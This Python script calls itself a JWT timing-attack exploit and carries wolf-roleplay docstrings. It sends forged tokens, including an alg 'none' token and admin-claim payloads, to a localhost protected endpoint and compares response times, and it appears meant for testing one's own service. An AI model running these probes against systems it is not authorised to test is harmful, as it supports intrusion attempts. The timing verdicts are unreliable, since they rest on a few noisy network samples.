"""🐺 JWT TIMING ATTACK EXPLOIT

*snarls with predatory glee* Your JWT validation might be vulnerable to timing attacks!
Constant-time comparison is crucial for secure token validation!

*bares fangs with savage satisfaction* This exploit demonstrates timing-based
attacks against JWT signature validation.
"""

import statistics
import time
from dataclasses import dataclass

import requests
from rich.console import Console

console = Console()


@dataclass
class TimingResult:
    """Result of a timing attack attempt"""

    success: bool
    technique: str
    timing_difference: float
    description: str


class JWTTimingAttack:
    """*circles with menacing intent* Exploits JWT timing vulnerabilities"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()

    def run_exploit(self) -> list[TimingResult]:
        """*snarls with predatory glee* Execute timing attacks"""
        console.print("[bold red]🐺 JWT TIMING ATTACK[/bold red]")

        results = []

        # Test various timing attack techniques
        results.append(self._test_signature_timing())
        results.append(self._test_algorithm_timing())
        results.append(self._test_payload_timing())

        return results

    def _test_signature_timing(self) -> TimingResult:
        """Test signature validation timing"""
        try:
            # Test with valid signature
            valid_times = self._measure_token_validation_times("valid_token", 10)

            # Test with invalid signature
            invalid_times = self._measure_token_validation_times("invalid_token", 10)

            # Calculate timing difference
            valid_avg = statistics.mean(valid_times)
            invalid_avg = statistics.mean(invalid_times)
            timing_diff = abs(valid_avg - invalid_avg)

            # If timing difference is significant (> 10ms), it's vulnerable
            vulnerable = timing_diff > 0.01

            return TimingResult(
                success=vulnerable,
                technique="Signature Timing",
                timing_difference=timing_diff,
                description=f"Signature validation timing difference: {timing_diff:.4f}s - {'VULNERABLE' if vulnerable else 'SECURE'}",
            )

        except Exception as e:
            return TimingResult(
                success=False,
                technique="Signature Timing",
                timing_difference=0,
                description=f"Signature timing test failed: {e!s}",
            )

    def _test_algorithm_timing(self) -> TimingResult:
        """Test algorithm validation timing"""
        try:
            # Test with different algorithms
            hs256_times = self._measure_algorithm_times("HS256", 5)
            rs256_times = self._measure_algorithm_times("RS256", 5)
            none_times = self._measure_algorithm_times("none", 5)

            # Calculate timing differences
            hs256_avg = statistics.mean(hs256_times)
            rs256_avg = statistics.mean(rs256_times)
            none_avg = statistics.mean(none_times)

            max_diff = max(
                abs(hs256_avg - rs256_avg),
                abs(hs256_avg - none_avg),
                abs(rs256_avg - none_avg),
            )

            vulnerable = max_diff > 0.01

            return TimingResult(
                success=vulnerable,
                technique="Algorithm Timing",
                timing_difference=max_diff,
                description=f"Algorithm validation timing difference: {max_diff:.4f}s - {'VULNERABLE' if vulnerable else 'SECURE'}",
            )

        except Exception as e:
            return TimingResult(
                success=False,
                technique="Algorithm Timing",
                timing_difference=0,
                description=f"Algorithm timing test failed: {e!s}",
            )

    def _test_payload_timing(self) -> TimingResult:
        """Test payload validation timing"""
        try:
            # Test with different payload sizes
            small_payload_times = self._measure_payload_times("small", 5)
            large_payload_times = self._measure_payload_times("large", 5)

            small_avg = statistics.mean(small_payload_times)
            large_avg = statistics.mean(large_payload_times)
            timing_diff = abs(small_avg - large_avg)

            vulnerable = timing_diff > 0.01

            return TimingResult(
                success=vulnerable,
                technique="Payload Timing",
                timing_difference=timing_diff,
                description=f"Payload validation timing difference: {timing_diff:.4f}s - {'VULNERABLE' if vulnerable else 'SECURE'}",
            )

        except Exception as e:
            return TimingResult(
                success=False,
                technique="Payload Timing",
                timing_difference=0,
                description=f"Payload timing test failed: {e!s}",
            )

    def _measure_token_validation_times(
        self,
        token_type: str,
        iterations: int,
    ) -> list[float]:
        """Measure token validation times"""
        times = []

        for _ in range(iterations):
            start_time = time.time()

            try:
                if token_type == "valid_token":
                    # Use a properly formatted but invalid token
                    headers = {
                        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                    }
                else:
                    # Use an invalid token
                    headers = {"Authorization": "Bearer invalid.token.here"}

                response = self.session.get(
                    f"{self.base_url}/api/protected",
                    headers=headers,
                    timeout=5,
                )

            except Exception:
                pass

            end_time = time.time()
            times.append(end_time - start_time)

        return times

    def _measure_algorithm_times(self, algorithm: str, iterations: int) -> list[float]:
        """Measure algorithm validation times"""
        times = []

        for _ in range(iterations):
            start_time = time.time()

            try:
                # Create token with specific algorithm
                if algorithm == "HS256":
                    headers = {
                        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                    }
                elif algorithm == "RS256":
                    headers = {
                        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid",
                    }
                else:  # none
                    headers = {
                        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    }

                response = self.session.get(
                    f"{self.base_url}/api/protected",
                    headers=headers,
                    timeout=5,
                )

            except Exception:
                pass

            end_time = time.time()
            times.append(end_time - start_time)

        return times

    def _measure_payload_times(self, payload_size: str, iterations: int) -> list[float]:
        """Measure payload validation times"""
        times = []

        for _ in range(iterations):
            start_time = time.time()

            try:
                if payload_size == "small":
                    # Small payload
                    headers = {
                        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.invalid",
                    }
                else:
                    # Large payload with many claims
                    large_payload = (
                        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                        "eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwiZW1haWwiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImRlbGV0ZSIsImFkbWluIl0sIm1ldGFkYXRhIjp7ImNyZWF0ZWRfYXQiOiIyMDI0LTAxLTAxVDAwOjAwOjAwWiIsImxhc3RfbG9naW4iOiIyMDI0LTAxLTAxVDAwOjAwOjAwWiIsImxvZ2luX2NvdW50IjoxMDAwLCJpcF9hZGRyZXNzIjoiMTkyLjE2OC4xLjEiLCJ1c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2In19.invalid"
                    )
                    headers = {"Authorization": f"Bearer {large_payload}"}

                response = self.session.get(
                    f"{self.base_url}/api/protected",
                    headers=headers,
                    timeout=5,
                )

            except Exception:
                pass

            end_time = time.time()
            times.append(end_time - start_time)

        return times
